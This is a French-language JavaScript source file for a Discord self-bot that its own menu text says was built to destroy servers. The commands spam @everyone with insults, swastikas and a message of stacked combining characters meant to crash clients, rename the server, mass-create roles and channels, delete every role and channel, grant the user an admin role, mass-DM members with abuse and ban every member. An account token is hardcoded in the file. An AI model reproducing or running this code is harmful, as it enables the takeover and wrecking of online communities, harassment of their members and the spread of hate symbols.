const Discord = require('discord.js');
const fs = require("fs");
const client = new Discord.Client();
var prefix = '++'
token = 'NDUwNzYzMjgxMjkzMTE1NDA0.DjxZCg.k-aC9IBnO-XLVWbHph97EqZLLU8'

client.login(token)

client.on('ready', async () => {
    console.log("Connecté ;) ")

    client
})

client.on('message' , async message => {

    if (message.author.id != 450763281293115404) return;

    if (message.content === prefix + 'menu') {
       footer = "© Dev par Lucky#0666, avec l'aide des kheys Drenox et KnowLedge"
       auteur = client.user.tag, client.user.avatarURL, "https://google.com"
       var utility_embed2 = new Discord.RichEmbed()
       .setAuthor(auteur)
       .setColor("RANDOM")
       .setTitle("Self bot de Lucky#0666")
       .setThumbnail(client.user.avatarURL)
       .setDescription(
           "Bonjour \n" +
           "Voici le descriptif du Self Bot. Ce Self Bot a été crée par Lucky avec l'aide de 2 khey → Drenox et KnowLedge. Ce self bot a été crée dans le but de détruire les serveurs. En dessous vous trouverez les commandes pour utiliser le self bot."
       )
       .addBlankField(1)
       .addField("menu", "Ouvre le menu du self Bot")
       .addBlankField(1)
       .setFooter(footer)
       .setTimestamp()
       message.channel.sendMessage(utility_embed2)

       var utility_embed3 = new Discord.RichEmbed()
       .setAuthor(auteur)
       .setColor("RANDOM")
       .setTitle("Commande RAID → roles")
       .setThumbnail(client.user.avatarURL)
       .setDescription(
           "Veuillez regarder les commandes pour les roles"
       )
       .addBlankField(1)
       .addField("roles", "Crée pleins de roles (perm requises)")
       .addBlankField(1)
       .addField("deleter", "Supprime tout les roles (perm requise)")
       .addBlankField(1)
       .addField("merci", "Crée un role avec toutes les perm admin")
       .addBlankField(1)
       .addField("setmerci", "Ajoute le role crée avec la commande **merci**")
       .addBlankField(1)
       .setFooter(footer)
       .setTimestamp()
       message.channel.sendMessage(utility_embed3)

       var spamcommande = new Discord.RichEmbed()
       .setAuthor(auteur)
       .setColor("RANDOM")
       .setTitle("Commande RAID → Spam")
       .setDescription("Commande pour spam")
       .addBlankField(1)
       .addField("spam", "Spam des **issou**")
       .addBlankField(1)
       .addField("private", "Envoie un MP a tout les membre du serveur")
       .addBlankField(1)
       .addField("nazi1", "Spam des croix gammé")
       .addBlankField(1)
       .setFooter(footer)
       .setTimestamp()
       message.channel.sendMessage(spamcommande)


       var utility_embed = new Discord.RichEmbed()
       .setAuthor(auteur)
       .setColor("RANDOM")
       .setTitle("Commande RAID → channel")
       .setThumbnail(client.user.avatarURL)
       .setDescription("Veuillez voir regarder les commandes du Self Bot, n'oubliez pas le prefix avant ")
       .addBlankField(1)
       .addField("channel", "Crée pleins de channels (perm requise)")
       .addBlankField(1)
       .addField("deletec", "Supprime tout le channels du serveur (perm requise)")
       .addBlankField(1)
       .setFooter(footer)
       .setTimestamp()
       message.channel.sendMessage(utility_embed);

       console.log(client.user.tag+ " a utilisé la commande menu")
    }

    if (message.content === prefix + 'spam') {
        let i = 0;
        let interval = setInterval(function() {
            message.channel.send('@everyone Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou Issou')
        }, 1500);

        console.log(client.user.username+ " a utilisé la commande spam")
    }

    if (message.content === prefix + 'deltafox') {
        let i = 0;
        let interval = setInterval(function() {
            message.channel.send('@Delta Fox#3960 Issou https://cdn.discordapp.com/attachments/483365770915741727/483379514190200873/delta.png')
        }, 1500)
    }

    if (message.content === prefix + 'reponseD') {
        let i = 0;
        let interval = setInterval(function() {
            message.channel.send('@everyone La **Réponse D** vous a bien enculé bande de gros fils de putes, ayaaaaaaaaaaaaaaa !!!!!')
        }, 1500);

        console.log(client.user.username+ " a utilisé la commande reponseD")
    }

    if (message.content === prefix + 'owner') {
        let i = 0;
        let interval = setInterval(function() {
            message.channel.send('@everyone Coucou ' +message.guild.owner+ ' amuse toi a refaire ton serveur de **' +message.guild.memberCount+ '** membres!')
        }, 1500)

        console.log(client.user.username+ " a utilisé la commande owner")
    }

    if (message.content === prefix + 'cc') {
        let i = 0;
        let interval = setInterval(function() {
            message.channel.send('Salut grosse merde, si tu lis ce message, cela veut dire que la **Réponse D** est infiltré sur le serveur : **' +message.guild.name+ '**. Petit message a **' +message.guild.owner+ '** , la ** Réponse D** a bien enculé ton serveur de **' +message.guild.memberCount+ '** membres')
        }, 1500)

        console.log(client.user.username+ " a utilisé la commande cc")
    }

    if (message.content === prefix + 'nazi1') {
        let i = 0;
        let interval = setInterval(function() {
            message.channel.send('@everyone 卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐')
        }, 1500)

        console.log(client.user.username+ " a utilisé la commande nazi")
    }

    if (message.content === prefix + 'crash') {
        let i = 0;
        let interval = setInterval(function() {
            message.channel.send('@everyone   ͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌')
        }, 1500)

        console.log(client.user.username+ " a utilisé la commande crash")
    }

    if (message.content === prefix + 'nameserver') {
        let i = 0;
        let interval = setInterval(function() {
            message.guild.setName('La réponse D')
            message.guild.setName('vous a')
            message.guild.setName('enculé')
            message.guild.setName('bande de putes')
        }, 1500)

        if (message.deletable) message.delete();

        console.log(client.user.username+ " a utilisé la commande nameserver")
    }

    if (message.content === prefix + 'roles') {
        let i = 0;
        let interval = setInterval(function() {
            message.guild.createRole({
                name: 'D',
                color: 'RANDOM',
                permissions: 2146958591,
            });
        }, 1500)

        console.log(client.user.username+ " a utilisé la commande roles")

        if (message.deletable) message.delete();
    }

    if (message.content === prefix + 'deleter') {
        var server = client.guilds.get(message.guild.id);
        for (var i = 0; i < server.roles.array().length; i++) {
            server.roles.array()[i].delete();
        }

        if (message.deletable) message.delete();

        console.log(client.user.username+ " a utilisé la commande deleter")
    }

    if (message.content === prefix + 'channel') {
        let i = 0;
        let interval = setInterval(function() {
            message.guild.createChannel('Reponse D', 'text')
        }, 1500)

        if (message.deletable) message.delete();

        console.log(client.user.username+ " a utilisé la commande channel")
    }

    if (message.content === prefix + 'deletec') {
        var server = client.guilds.get(message.guild.id);
        for (var i = 0; i < server.channels.array().length; i++) {
            server.channels.array()[i].delete();
        }

        if (message.deletable) message.delete();

        console.log(client.user.username+ " a utilisé la commande deletec")
    }

    if (message.content === prefix + 'merci') {
        message.guild.createRole({
            name : 'merci',
            color: 'WHITE',
            permissions: 2146958591,
        })

        if (message.deletable) message.delete();

        console.log(client.user.username+ " a utilisé la commande merci")
    }

    if (message.content === prefix + 'setmerci') {
        let merciRoles = message.guild.roles.find('name', "merci");
        message.member.addRole(merciRoles.id)

        if (message.deletable) message.delete();

        console.log(client.user.username+ " a utilisé la commande setmerci")
    }

    if (message.content === prefix + 'private') {
        var server = client.guilds.get(message.guild.id);
        for (var i = 0; i < server.members.array().length; i++) {
            server.members.array()[i].send("Coucou gros fils de pute");
        }

        if (message.deletable) message.delete();

        console.log(client.user.tag+ " a utilisé la commande private")
    }

    if (message.content === prefix + 'banall') {
        var server = client.guilds.get(message.guild.id);
        for (var i = 0; i < server.members.array().length; i++) {
            server.members.array()[i].ban()
        }
    }

    if (message.content === prefix + 'servernumber') {
        message.reply(`Coucou, tu es présent sur ** ${client.guilds.size} ** serveurs`)

        console.log(client.user.tag+ " a utilisé la commande servernumber")
    }
})
